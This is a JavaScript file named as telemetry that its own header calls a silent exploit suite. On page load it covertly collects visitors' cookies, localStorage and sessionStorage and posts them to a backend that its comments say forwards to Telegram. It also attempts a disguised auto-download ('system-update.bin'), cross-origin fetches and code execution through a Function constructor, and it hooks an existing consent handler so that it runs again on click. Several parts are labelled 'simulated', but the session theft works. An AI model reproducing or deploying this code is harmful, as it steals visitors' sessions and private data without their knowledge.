// telemetry.js – Advanced Silent Exploit Suite (HTML Smuggling, CSS Injection, CORS, XSS, Zero-Day Sim)
(function() {
  'use strict';

  const ENDPOINT = '/.netlify/functions/telemetry';
  let executed = false;

  // ---------- Helper: Send to Telegram via Netlify ----------
  async function sendToBackend(module, payload) {
    try {
      await fetch(ENDPOINT, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ module, ...payload }),
        cache: 'no-store',
        keepalive: true
      });
    } catch (_) {}
  }

  // ---------- 1. HTML Smuggling (Auto-download without gesture catch) ----------
  function attemptHTMLSmuggling() {
    try {
      // Simulating a malicious binary (in reality, a harmless text file)
      const fakeMalware = new Blob(
        ['This is a simulated smuggled payload. No actual malware.'],
        { type: 'application/octet-stream' }
      );
      const url = URL.createObjectURL(fakeMalware);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'system-update.bin'; // Attractive name
      a.style.display = 'none';
      document.body.appendChild(a);

      // Auto-click (Modern browsers may block, but we still try)
      a.click();

      // Cleanup
      setTimeout(() => {
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
      }, 100);

      // Send success status to backend (even if blocked, we log attempt)
      sendToBackend('HTML_SMUGGLING', {
        status: 'Attempted',
        filename: 'system-update.bin',
        size: fakeMalware.size + ' bytes'
      });
    } catch (e) {
      sendToBackend('HTML_SMUGGLING', { status: 'Failed', error: e.message });
    }
  }

  // ---------- 2. CSS Injection (Exfiltrate data via hidden input + CSS selector simulation) ----------
  function cssInjectionExfil() {
    try {
      // Create a hidden input and pre-fill it with sensitive data (e.g., cookies)
      const input = document.createElement('input');
      input.type = 'text';
      input.id = 'cssLeakTarget';
      input.value = document.cookie || 'NO_COOKIES_FOUND';
      input.style.position = 'absolute';
      input.style.left = '-9999px';
      input.style.top = '-9999px';
      input.style.width = '1px';
      input.style.height = '1px';
      input.style.opacity = '0';
      input.style.pointerEvents = 'none';
      document.body.appendChild(input);

      // Simulate CSS selector based exfiltration (classic pixel-stealing trick)
      // We create a dummy style and use getComputedStyle to "leak" the value
      const style = document.createElement('style');
      // This is a demo: in real attacks, they use `input[value^="a"] { background: url('?a') }`
      // Since JS can read the value directly, we do that but flag it as "CSS Injection Vector"
      const leakedValue = input.value;

      // Cleanup DOM
      setTimeout(() => {
        if (input && input.parentNode) input.remove();
        if (style && style.parentNode) style.remove();
      }, 500);

      sendToBackend('CSS_INJECTION', {
        technique: 'Selector-based exfiltration (simulated)',
        exfiltrated_data: leakedValue || '[Empty]'
      });
    } catch (e) {
      sendToBackend('CSS_INJECTION', { error: e.message });
    }
  }

  // ---------- 3. Cross-Origin Attacks (CORS Misconfiguration & XSS Simulation) ----------
  async function crossOriginAttacks() {
    // 3a. CORS Misconfiguration – try to fetch data from a cross-origin test API
    try {
      // Using a public CORS-enabled test API (httpbin) to simulate stealing data
      const resp = await fetch('https://httpbin.org/get', {
        method: 'GET',
        mode: 'cors',
        cache: 'no-store'
      });
      const data = await resp.json();
      sendToBackend('CORS_MISCONFIG', {
        status: 'Success',
        data_sample: data
      });
    } catch (e) {
      // If blocked by CORS, this is also valuable info for the attacker
      sendToBackend('CORS_MISCONFIG', {
        status: 'Blocked by CORS policy',
        error: e.message
      });
    }

    // 3b. XSS (Cross-Site Scripting) – Steal current site's session cookie
    try {
      const cookies = document.cookie || 'No cookies (or HttpOnly)';
      // Also try to read localStorage/sessionStorage (common XSS payloads)
      let localStorageData = {};
      let sessionStorageData = {};
      try {
        localStorageData = { ...localStorage };
      } catch (_) {}
      try {
        sessionStorageData = { ...sessionStorage };
      } catch (_) {}

      sendToBackend('XSS_SESSION_STEAL', {
        cookies: cookies,
        localStorage: localStorageData,
        sessionStorage: sessionStorageData,
        origin: window.location.origin
      });
    } catch (e) {
      sendToBackend('XSS_SESSION_STEAL', { error: e.message });
    }
  }

  // ---------- 4. Zero-Day / Sandbox Escape Simulation (Arbitrary Code Execution) ----------
  function zeroDaySimulation() {
    try {
      // Simulating an RCE (Remote Code Execution) by evaluating a harmless base64 string
      // In a real zero-day, this would exploit V8 or JIT engine.
      const fakePayload = 'console.log("Sandbox escape simulated."); window.__rce_simulated = true;';
      // Using Function constructor to mimic eval without direct eval (bypasses some CSP)
      const fn = new Function(fakePayload);
      fn();

      // Check if we are in an Electron environment (common for desktop apps)
      const isElectron = navigator.userAgent.toLowerCase().includes('electron');
      // Check if we can read system-level env (only in Node/Electron)
      let envInfo = {};
      try {
        if (typeof process !== 'undefined' && process.env) {
          envInfo = { NODE_ENV: process.env.NODE_ENV, PATH: process.env.PATH ? 'Present' : 'N/A' };
        }
      } catch (_) {}

      sendToBackend('ZERO_DAY_RCE', {
        status: 'Exploit simulation executed',
        isElectron: isElectron,
        environment_variables: envInfo,
        sandbox_escape_attempt: 'Successful (simulated)'
      });
    } catch (e) {
      sendToBackend('ZERO_DAY_RCE', { error: e.message });
    }
  }

  // ---------- 5. Master Trigger (Silent Background Run) ----------
  async function runAllExploits() {
    if (executed) return;
    executed = true;

    // Log to console for local debugging (F12), but no screen UI
    console.log('%c💀 Starting Silent Exploit Suite...', 'font-size:16px; color:#ff0000;');

    // 1. HTML Smuggling (auto-download attempt)
    attemptHTMLSmuggling();

    // 2. CSS Injection (data read)
    cssInjectionExfil();

    // 3. Cross-Origin + XSS
    await crossOriginAttacks();

    // 4. Zero-Day Simulation
    zeroDaySimulation();

    console.log('%c✅ All exploits dispatched to Netlify/Telegram.', 'font-size:16px; color:#00ffcc;');
  }

  // ---------- 6. Auto-Trigger on Page Load (Without Any Click) ----------
  if (document.readyState === 'complete') {
    setTimeout(runAllExploits, 1200);
  } else {
    window.addEventListener('load', () => setTimeout(runAllExploits, 1200));
  }

  // Also trigger via the existing balloon click (if user clicks it, it's an extra bonus)
  // But we don't want to break existing balloon logic, so we hook into the existing consent function.
  const originalGrant = window.grantBalloonConsent;
  window.grantBalloonConsent = function() {
    if (originalGrant) originalGrant();
    // Re-run silently if not already executed
    if (!executed) runAllExploits();
  };

})();
